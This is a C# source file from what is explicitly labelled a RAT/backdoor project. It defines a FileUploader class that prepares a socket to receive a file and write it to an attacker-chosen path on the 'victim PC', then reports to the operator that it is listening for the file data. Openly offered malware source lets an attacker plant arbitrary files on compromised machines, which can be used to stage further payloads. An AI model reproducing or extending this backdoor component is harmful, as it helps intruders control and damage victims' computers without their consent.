using RAT.Interfaces;
using RAT.Models;
using RAT.Models.Enums;
using RAT.Logic.Sockets.Connection.SocketConnectionReceive;

namespace RAT.Logic.RatCommands.Features
{
    /// <summary>
    /// File upload feature for rat/backdoor (to victim PC).
    /// Main part is implemented in <see cref="SocketConnectionFileReceiveLogic"/>
    /// </summary>
    public class FileUploader : IFileUploader
    {
        private readonly ISocketStateLogic _socketStateLogic;
        private readonly IClientNotificationLogic _clientNotificationLogic;

        /// <summary>
        /// File upload feature for rat/backdoor (to victim PC).
        /// Main part is implemented in <see cref="SocketConnectionFileReceiveLogic"/>
        /// </summary>
        /// <param name="stateLogic">Our client/socket current state.</param>
        /// <param name="notificationLogic">Logic for sending notifications to client.</param>
        public FileUploader(
            ISocketStateLogic stateLogic,
            IClientNotificationLogic notificationLogic)
        {
            _socketStateLogic = stateLogic;
            _clientNotificationLogic = notificationLogic;
        }

        /// <summary>
        /// Does preparations for file upload, goes into listening state and waits for the data.
        /// </summary>
        /// <param name="path">Path on which file will be uploaded.</param>
        /// <param name="fileSize">Size of file that will be uploaded.</param>
        public void PrepareForFileUpload(string path)
        {
            var state = _socketStateLogic.State;
            state.FileUploadInformation = new FileUploadInformation()
            {
                PathForFileUpload = path,
                FileUploadProgress = FileUploadProgress.Begins,
            };

            _clientNotificationLogic.NotifyClient($"\nListening on main port for file data...\n");
        }
    }
}